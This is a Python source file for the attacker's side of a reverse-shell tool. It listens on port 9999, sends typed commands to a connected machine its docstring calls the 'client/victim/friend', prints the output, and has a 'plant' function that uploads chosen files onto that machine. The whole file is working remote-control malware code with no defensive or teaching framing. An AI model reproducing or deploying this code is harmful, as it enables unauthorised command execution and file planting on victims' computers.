import socket
import sys
import tqdm
import os

# receive 4096 bytes each time for the plant
BUFFER_SIZE = 4096
SEPARATOR = " "


def create_socket():
    """
    This function creates a socket and sets global variables for later use.
    """
    try:
        global host
        global port
        global s
        host = ""
        port = 9999
        s = socket.socket()
    except socket.error as msg:
        print("Socket creation error: " + str(msg))


def bind_socket():
    """
    This function binds the socket and listens for connections. If there's a socket binding error,
    it will recursively call itself to retry.
    """
    try:
        global host
        global port
        global s
        print("Binding the Port: " + str(port))
        s.bind((host, port))
        s.listen(5)
    except socket.error as msg:
        print("Socket Binding error" + str(msg) + "\n" + "Retrying...")
        bind_socket()


def socket_accept():
    """
    This function accepts a connection and prints the IP address and port number of the client. It also
    calls the send_commands() function to send commands to the client.
    """
    conn, address = s.accept()
    print("Connection has been established! |" + " IP " + address[0] + " | Port" + str(address[1]))
    send_commands(conn)
    conn.close()


def plant(filename, conn):
    try:
        # get the file size
        filesize = os.path.getsize(filename)
    except:
        print("ERROR! file does not exist...")
        conn.send(b"500")
        return 0

    conn.send(b"200")

    while True:
        client_response = str(conn.recv(1024), "utf-8")
        if client_response == "200":
            break

    # send the filename and filesize
    conn.send(f"{filename}{SEPARATOR}{filesize}".encode())

    while True:
        client_response = str(conn.recv(1024), "utf-8")
        if client_response == "200":
            break

    # start sending the file
    progress = tqdm.tqdm(range(filesize), f"Sending {filename}", unit="B", unit_scale=True, unit_divisor=1024)
    with open(filename, "rb") as f:
        while True:
            # read the bytes from the file
            bytes_read = f.read(BUFFER_SIZE)
            if not bytes_read:
                conn.send(b"200")
                break

            # we use sendall to assure transimission in
            # busy networks
            conn.sendall(bytes_read)
            # update the progress bar
            progress.update(len(bytes_read))
    conn.send(b"200")


def send_commands(conn):
    """
    This function sends commands to the client/victim/friend. It takes input from the user until the
    'quit' command is entered. It also prints out any response from the client.
    """
    while True:
        cmd = input()
        if cmd == 'quit':
            conn.close()
            s.close()
            sys.exit()
        if len(cmd) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024),"utf-8")
            if client_response == "plnt":
                file_to_copy = input("Enter path to file in your computer: ")
                try:
                    plant(file_to_copy, conn)
                    print("all good")
                except:
                    conn.send(b"500")
                    print("ERROR in coping file, try again!")

                conn.sendall(str.encode("finish"))

                while True:
                    wd = str(conn.recv(1024))




            else:
                print(client_response, end="")



def main():
    """
    This function is the main entry point of the program. It calls the create_socket(), bind_socket(),
    and socket_accept() functions to set up the socket and wait for a connection.
    """
    create_socket()
    bind_socket()
    socket_accept()


if __name__ == "__main__":
    main()
